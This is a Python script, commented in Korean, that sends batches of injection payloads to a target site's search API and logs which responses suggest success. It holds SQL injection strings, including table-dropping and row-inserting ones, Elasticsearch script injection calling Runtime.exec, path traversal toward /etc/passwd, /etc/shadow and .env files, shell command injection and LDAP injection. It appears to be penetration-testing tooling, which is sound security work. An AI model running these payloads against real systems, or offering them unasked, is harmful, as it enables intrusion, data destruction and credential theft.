"""
대상 서비스 API Injection 공격 테스트
- SQL Injection
- NoSQL Injection (Elasticsearch)
- Command Injection
- LDAP Injection
- Path Traversal
"""

import requests
import json
import sys
from datetime import datetime

BASE_URL = "https://www.example-target.com"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Content-Type": "application/json",
    "Referer": "https://www.example-target.com/service"
}

# 로그 파일 설정
timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
log_file = open(f"logs/test05_injection_{timestamp}.log", "w", encoding="utf-8")

def log_print(message):
    """콘솔과 파일에 동시 출력"""
    print(message)
    log_file.write(message + "\n")
    log_file.flush()


def test_endpoint(method, url, payload=None, headers=HEADERS, test_name=""):
    """엔드포인트 테스트 및 상세 응답 분석"""
    log_print(f"\n{'='*70}")
    log_print(f"테스트: {test_name}")
    log_print(f"페이로드: {str(payload)[:100] if payload else 'None'}")
    log_print(f"{'='*70}")

    try:
        if method == "GET":
            response = requests.get(url, headers=headers, timeout=15)
        elif method == "POST":
            response = requests.post(url, headers=headers, json=payload, timeout=15)
        else:
            response = requests.request(method, url, headers=headers, json=payload, timeout=15)

        log_print(f"상태 코드: {response.status_code}")

        # 응답 분석
        try:
            data = response.json()
            response_str = json.dumps(data, ensure_ascii=False, indent=2)

            # 민감 정보 체크
            check_injection_success(response, payload)

            if len(response_str) > 1000:
                log_print(f"\n[응답 (요약)]")
                log_print(response_str[:1000] + "...")
            else:
                log_print(f"\n[응답]")
                log_print(response_str)

        except:
            log_print(f"\n[응답 (텍스트)]")
            log_print(response.text[:1000] if len(response.text) > 1000 else response.text)
            check_injection_success(response, payload)

        return response

    except Exception as e:
        log_print(f"에러: {str(e)}")
        return None


def check_injection_success(response, payload):
    """Injection 성공 여부 확인"""
    text = response.text.lower()
    payload_str = str(payload).lower() if payload else ""

    # SQL Injection 성공 징후
    sql_indicators = [
        ("sql syntax", "SQL 구문 오류 노출"),
        ("mysql", "MySQL 정보 노출"),
        ("postgresql", "PostgreSQL 정보 노출"),
        ("ora-", "Oracle 오류 노출"),
        ("sqlite", "SQLite 정보 노출"),
        ("syntax error", "구문 오류 발생"),
        ("unclosed quotation", "따옴표 미닫힘 오류"),
        ("query failed", "쿼리 실행 실패"),
    ]

    # NoSQL Injection 성공 징후
    nosql_indicators = [
        ("elasticsearch", "Elasticsearch 정보 노출"),
        ("mongodb", "MongoDB 정보 노출"),
        ("parse_exception", "파싱 예외 발생"),
        ("query_shard_exception", "쿼리 샤드 예외"),
        ("illegal_argument_exception", "잘못된 인자 예외"),
    ]

    # Command Injection 성공 징후
    command_indicators = [
        ("root:", "시스템 사용자 정보 노출"),
        ("/bin/", "시스템 경로 노출"),
        ("uid=", "UID 정보 노출"),
        ("drwx", "디렉토리 목록 노출"),
    ]

    # Path Traversal 성공 징후
    path_indicators = [
        ("root:x:", "/etc/passwd 내용 노출"),
        ("[extensions]", "php.ini 또는 설정파일 노출"),
        ("secret", "시크릿 정보 노출"),
        ("private", "비공개 정보 노출"),
    ]

    all_indicators = sql_indicators + nosql_indicators + command_indicators + path_indicators

    found = []
    for pattern, description in all_indicators:
        if pattern in text:
            found.append(f"⚠️  {description}: '{pattern}' 발견")

    if found:
        log_print(f"\n[!!! Injection 성공 가능성 !!!]")
        for item in found:
            log_print(f"  {item}")
    else:
        log_print(f"\n[Injection 징후 미발견]")


def run_sql_injection_tests():
    """SQL Injection 테스트"""
    log_print("\n" + "#"*70)
    log_print("# 1. SQL Injection 테스트")
    log_print("#"*70)

    sql_payloads = [
        # 기본 SQL Injection
        ("' OR '1'='1", "기본 OR 구문"),
        ("' OR 1=1--", "주석을 이용한 OR"),
        ("admin'--", "주석을 이용한 인증 우회"),
        ("' OR 'a'='a", "문자 비교"),
        ("') OR ('1'='1", "괄호 포함"),

        # UNION 기반 SQL Injection
        ("' UNION SELECT NULL--", "UNION SELECT NULL"),
        ("' UNION SELECT NULL,NULL--", "UNION SELECT (2개)"),
        ("' UNION SELECT NULL,NULL,NULL--", "UNION SELECT (3개)"),
        ("' UNION SELECT version()--", "DB 버전 조회"),
        ("' UNION SELECT database()--", "DB 이름 조회"),
        ("' UNION SELECT user()--", "사용자 조회"),

        # Boolean 기반 Blind SQL Injection
        ("' AND 1=1--", "Boolean True"),
        ("' AND 1=2--", "Boolean False"),
        ("' AND SLEEP(5)--", "시간 지연 (MySQL)"),
        ("'; WAITFOR DELAY '00:00:05'--", "시간 지연 (MSSQL)"),
        ("' AND pg_sleep(5)--", "시간 지연 (PostgreSQL)"),

        # Stacked Queries
        ("'; DROP TABLE users--", "테이블 삭제 시도"),
        ("'; INSERT INTO users VALUES('hacker','pass')--", "데이터 삽입 시도"),

        # 특수 문자 이스케이프 우회
        ("%27 OR %271%27=%271", "URL 인코딩"),
        ("\\' OR \\'1\\'=\\'1", "백슬래시 이스케이프"),
        ("' OR '1'='1' /*", "C 스타일 주석"),
        ("' OR '1'='1' #", "MySQL 주석"),

        # 에러 기반 SQL Injection
        ("'", "단일 따옴표"),
        ("''", "이중 따옴표"),
        ("' AND (SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT version()), 0x3a, FLOOR(RAND()*2)) AS x FROM information_schema.tables GROUP BY x) y)--", "에러 기반 버전 추출"),
    ]

    for payload, name in sql_payloads:
        test_payload = {
            "query_string": payload,
            "page": 1,
            "size": 10
        }
        test_endpoint("POST", f"{BASE_URL}/api_renewal/ko/expert_search",
                     test_payload, HEADERS, f"SQL Injection - {name}")


def run_nosql_injection_tests():
    """NoSQL Injection 테스트 (Elasticsearch)"""
    log_print("\n" + "#"*70)
    log_print("# 2. NoSQL Injection 테스트 (Elasticsearch)")
    log_print("#"*70)

    nosql_payloads = [
        # Elasticsearch 쿼리 구문 인젝션
        ('{"query": {"match_all": {}}}', "match_all 쿼리"),
        ('{"query": {"bool": {"must": [{"match_all": {}}]}}}', "bool must 쿼리"),
        ('" OR "a"="a', "OR 조건"),

        # JSON 인젝션
        ('", "test": "value"}', "JSON 구조 탈출"),
        ('\\", "admin": true, \\"test\\":\\"', "JSON 인젝션"),

        # 정규식 인젝션
        ('.*', "모든 문자 매칭"),
        ('^.*$', "정규식 전체 매칭"),
        ('(?i)admin', "대소문자 무시"),

        # Script 인젝션 (Groovy/Painless)
        ('"}; return true; //', "스크립트 인젝션"),
        ('"}; java.lang.Runtime.getRuntime().exec("id"); //', "커맨드 실행 시도"),

        # 특수 연산자
        ('{"$gt": ""}', "MongoDB 스타일 연산자"),
        ('{"$ne": null}', "not equal 연산자"),
        ('{"$where": "1==1"}', "$where 연산자"),
    ]

    for payload, name in nosql_payloads:
        test_payload = {
            "query_string": payload,
            "page": 1,
            "size": 10
        }
        test_endpoint("POST", f"{BASE_URL}/api_renewal/ko/expert_search",
                     test_payload, HEADERS, f"NoSQL Injection - {name}")


def run_path_traversal_tests():
    """Path Traversal 테스트"""
    log_print("\n" + "#"*70)
    log_print("# 3. Path Traversal 테스트")
    log_print("#"*70)

    path_payloads = [
        # 기본 Path Traversal
        ("../../../etc/passwd", "Unix passwd"),
        ("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "Windows hosts"),
        ("....//....//....//etc/passwd", "점 4개 우회"),
        ("..;/..;/..;/etc/passwd", "세미콜론 추가"),

        # URL 인코딩
        ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "URL 인코딩"),
        ("..%252f..%252f..%252fetc%252fpasswd", "이중 URL 인코딩"),

        # Null byte
        ("../../../etc/passwd%00", "Null byte"),
        ("../../../etc/passwd%00.jpg", "Null byte + 확장자"),

        # 절대 경로
        ("/etc/passwd", "절대 경로"),
        ("/etc/shadow", "shadow 파일"),
        ("/proc/self/environ", "환경변수"),
        ("/proc/self/cmdline", "커맨드라인"),

        # 설정 파일
        ("../../.env", ".env 파일"),
        ("../../config.json", "config.json"),
        ("../../config/database.yml", "database.yml"),
        ("../../app/config/parameters.yml", "parameters.yml"),
    ]

    for payload, name in path_payloads:
        # query_string에 주입
        test_payload = {
            "query_string": payload,
            "page": 1,
            "size": 10
        }
        test_endpoint("POST", f"{BASE_URL}/api_renewal/ko/expert_search",
                     test_payload, HEADERS, f"Path Traversal (query) - {name}")

    # URL 경로에 직접 주입
    for payload, name in path_payloads[:5]:  # 일부만 테스트
        test_endpoint("GET", f"{BASE_URL}/api_renewal/ko/{payload}",
                     None, HEADERS, f"Path Traversal (URL) - {name}")


def run_command_injection_tests():
    """Command Injection 테스트"""
    log_print("\n" + "#"*70)
    log_print("# 4. Command Injection 테스트")
    log_print("#"*70)

    command_payloads = [
        # Unix 커맨드
        ("; ls -la", "세미콜론 + ls"),
        ("| ls -la", "파이프 + ls"),
        ("& ls -la", "앰퍼샌드 + ls"),
        ("&& ls -la", "이중 앰퍼샌드 + ls"),
        ("`ls -la`", "백틱 + ls"),
        ("$(ls -la)", "달러 괄호 + ls"),

        # 정보 수집
        ("; cat /etc/passwd", "passwd 읽기"),
        ("; id", "사용자 ID 확인"),
        ("; whoami", "사용자 이름 확인"),
        ("; uname -a", "시스템 정보"),
        ("; pwd", "현재 디렉토리"),

        # Windows 커맨드
        ("& dir", "Windows dir"),
        ("| dir", "파이프 + dir"),
        ("& type C:\\Windows\\System32\\drivers\\etc\\hosts", "Windows hosts 읽기"),

        # 시간 지연 (Blind 검증)
        ("; sleep 5", "sleep 5초"),
        ("| ping -c 5 127.0.0.1", "ping 5회"),

        # 다중 커맨드
        ("; ls; pwd; whoami", "다중 커맨드"),
    ]

    for payload, name in command_payloads:
        test_payload = {
            "query_string": payload,
            "page": 1,
            "size": 10
        }
        test_endpoint("POST", f"{BASE_URL}/api_renewal/ko/expert_search",
                     test_payload, HEADERS, f"Command Injection - {name}")


def run_ldap_injection_tests():
    """LDAP Injection 테스트"""
    log_print("\n" + "#"*70)
    log_print("# 5. LDAP Injection 테스트")
    log_print("#"*70)

    ldap_payloads = [
        ("*", "와일드카드"),
        ("*()|&", "모든 속성"),
        ("admin*", "admin으로 시작"),
        ("*)(uid=*))(|(uid=*", "OR 조건"),
        ("*)(objectClass=*", "objectClass 조회"),
        ("admin)(&(password=*)", "AND 조건"),
    ]

    for payload, name in ldap_payloads:
        test_payload = {
            "query_string": payload,
            "page": 1,
            "size": 10
        }
        test_endpoint("POST", f"{BASE_URL}/api_renewal/ko/expert_search",
                     test_payload, HEADERS, f"LDAP Injection - {name}")


if __name__ == "__main__":
    log_print("="*70)
    log_print("대상 서비스 API Injection 공격 종합 테스트")
    log_print("="*70)

    try:
        run_sql_injection_tests()
        run_nosql_injection_tests()
        run_path_traversal_tests()
        run_command_injection_tests()
        run_ldap_injection_tests()

        log_print("\n" + "="*70)
        log_print("테스트 완료!")
        log_print(f"로그 파일: logs/test05_injection_{timestamp}.log")
        log_print("="*70)

    finally:
        log_file.close()
